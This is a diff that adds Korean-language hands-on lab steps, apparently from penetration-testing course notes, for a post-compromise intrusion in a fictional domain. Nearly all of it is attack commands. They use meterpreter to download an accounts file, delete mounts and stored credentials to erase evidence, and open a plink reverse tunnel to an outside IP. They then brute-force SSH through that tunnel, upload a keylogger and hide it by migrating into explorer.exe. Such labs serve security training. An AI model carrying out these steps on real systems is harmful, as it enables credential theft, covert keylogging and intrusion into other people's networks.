@@ -173,3 +173,43 @@ Step 3. accounts.txt 확인
 > type accounts.txt
 
 Step 4. 해당 파일 다운로드
+> exit
+meterpreter> download "c:\\users\\altair.coresec0\\document\accounts.txt" /tools/accounts.txt
+
+cat accounts.txt
+
+Hands-On) 증거 지우기
+
+Step 1. 마운트 해제
+c:\windows\temp> net use /delete t:
+
+Step 2. Cmdkey 삭제
+> cmdkey /delete:altair-pc.coresec.com
+
+Hands-On) 파일서버로 포트포워딩
+
+step 1. plink.exe 실행
+[Dobney]
+c:\windows\temp> plink -R 2222:192.168.12.10:22 black@121.34.43.137
+
+sudo su
+tar zxvf slowbrute.tgz
+python slowbrute.py -t 127.0.0.1 -u fladmn -p password.txt -d 2222
+
+Step 3. 파일서버 터널링
+# ssh fladmn@127.0.0.1 -p 2222
+
+Hands-on) 키로그
+
+Step 1. 키로그 툴 업로드
+[Purcell]
+meterpreter> upload /tools/keylog.exe c:\\users\\Purcell.coresec0\\downloads\\keylog.exe
+
+Step 2. 키로그 숨기기
+[Purcell]
+meterpreter> ps | grep explorer.exe
+meterpreter> migrate [PID]
+meterpreter> shell
+c:\windows\> keylog.exe
+
+
